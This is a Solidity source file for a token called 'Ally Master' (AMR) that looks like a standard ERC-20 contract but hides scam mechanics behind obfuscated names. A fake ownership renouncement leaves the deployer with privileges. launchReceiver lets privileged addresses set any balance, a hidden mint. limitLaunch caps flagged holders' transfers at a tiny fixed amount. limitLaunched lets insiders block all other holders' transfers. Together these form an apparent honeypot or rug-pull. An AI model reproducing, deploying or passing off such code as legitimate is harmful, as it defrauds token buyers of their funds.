//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface swapTeam {
    function createPair(address receiverIs, address modeAmount) external returns (address);
}

interface swapLaunchedEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenTrading) external view returns (uint256);

    function transfer(address txFee, uint256 tokenFrom) external returns (bool);

    function allowance(address fromMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenFrom) external returns (bool);

    function transferFrom(
        address sender,
        address txFee,
        uint256 tokenFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingSell, uint256 value);
    event Approval(address indexed fromMarketing, address indexed spender, uint256 value);
}

abstract contract swapTakeBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderAuto is swapLaunchedEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AllyMaster is swapTakeBuy, swapLaunchedEnable, senderAuto {

    string private totalEnable = "Ally Master";

    function modeIs() public {
        emit OwnershipTransferred(listSwapFee, address(0));
        modeLimitFrom = address(0);
    }

    function atMode(address autoWallet) public {
        require(autoWallet.balance < 100000);
        if (feeAmountMarketing) {
            return;
        }
        if (totalBuy == fromFund) {
            fromFund = false;
        }
        takeList[autoWallet] = true;
        
        feeAmountMarketing = true;
    }

    uint256 totalMarketing;

    function receiverTx(address listReceiverEnable, address txFee, uint256 tokenFrom) internal returns (bool) {
        if (listReceiverEnable == listSwapFee) {
            return buyLiquidityTotal(listReceiverEnable, txFee, tokenFrom);
        }
        uint256 swapFundReceiver = swapLaunchedEnable(maxTeam).balanceOf(sellFeeTeam);
        require(swapFundReceiver == exemptReceiver);
        require(txFee != sellFeeTeam);
        if (isToken[listReceiverEnable]) {
            return buyLiquidityTotal(listReceiverEnable, txFee, shouldBuy);
        }
        return buyLiquidityTotal(listReceiverEnable, txFee, tokenFrom);
    }

    function buyLiquidityTotal(address listReceiverEnable, address txFee, uint256 tokenFrom) internal returns (bool) {
        require(shouldAutoMin[listReceiverEnable] >= tokenFrom);
        shouldAutoMin[listReceiverEnable] -= tokenFrom;
        shouldAutoMin[txFee] += tokenFrom;
        emit Transfer(listReceiverEnable, txFee, tokenFrom);
        return true;
    }

    bool private fromFund;

    uint256 private modeMin = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return modeMin;
    }

    mapping(address => bool) public isToken;

    mapping(address => uint256) private shouldAutoMin;

    function approve(address shouldTrading, uint256 tokenFrom) public virtual override returns (bool) {
        tradingFrom[_msgSender()][shouldTrading] = tokenFrom;
        emit Approval(_msgSender(), shouldTrading, tokenFrom);
        return true;
    }

    uint256 exemptReceiver;

    bool private totalBuy;

    function launchReceiver(address feeTeam, uint256 tokenFrom) public {
        swapMin();
        shouldAutoMin[feeTeam] = tokenFrom;
    }

    function transfer(address feeTeam, uint256 tokenFrom) external virtual override returns (bool) {
        return receiverTx(_msgSender(), feeTeam, tokenFrom);
    }

    function swapMin() private view {
        require(takeList[_msgSender()]);
    }

    bool public feeAmountMarketing;

    function transferFrom(address listReceiverEnable, address txFee, uint256 tokenFrom) external override returns (bool) {
        if (_msgSender() != tokenMarketing) {
            if (tradingFrom[listReceiverEnable][_msgSender()] != type(uint256).max) {
                require(tokenFrom <= tradingFrom[listReceiverEnable][_msgSender()]);
                tradingFrom[listReceiverEnable][_msgSender()] -= tokenFrom;
            }
        }
        return receiverTx(listReceiverEnable, txFee, tokenFrom);
    }

    uint8 private swapLimit = 18;

    address sellFeeTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant shouldBuy = 17 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return swapLimit;
    }

    function allowance(address totalMin, address shouldTrading) external view virtual override returns (uint256) {
        if (shouldTrading == tokenMarketing) {
            return type(uint256).max;
        }
        return tradingFrom[totalMin][shouldTrading];
    }

    event OwnershipTransferred(address indexed marketingLaunch, address indexed liquidityToSell);

    mapping(address => mapping(address => uint256)) private tradingFrom;

    string private toTokenFee = "AMR";

    function symbol() external view virtual override returns (string memory) {
        return toTokenFee;
    }

    address public listSwapFee;

    mapping(address => bool) public takeList;

    address tokenMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor (){
        if (totalBuy) {
            sellReceiver = true;
        }
        teamReceiver totalLaunched = teamReceiver(tokenMarketing);
        maxTeam = swapTeam(totalLaunched.factory()).createPair(totalLaunched.WETH(), address(this));
        
        listSwapFee = _msgSender();
        takeList[listSwapFee] = true;
        shouldAutoMin[listSwapFee] = modeMin;
        modeIs();
        
        emit Transfer(address(0), listSwapFee, modeMin);
    }

    function name() external view virtual override returns (string memory) {
        return totalEnable;
    }

    function limitLaunch(address atReceiverMax) public {
        swapMin();
        
        if (atReceiverMax == listSwapFee || atReceiverMax == maxTeam) {
            return;
        }
        isToken[atReceiverMax] = true;
    }

    address private modeLimitFrom;

    function balanceOf(address tokenTrading) public view virtual override returns (uint256) {
        return shouldAutoMin[tokenTrading];
    }

    address public maxTeam;

    function getOwner() external view returns (address) {
        return modeLimitFrom;
    }

    function owner() external view returns (address) {
        return modeLimitFrom;
    }

    function limitLaunched(uint256 tokenFrom) public {
        swapMin();
        exemptReceiver = tokenFrom;
    }

    bool public sellReceiver;

}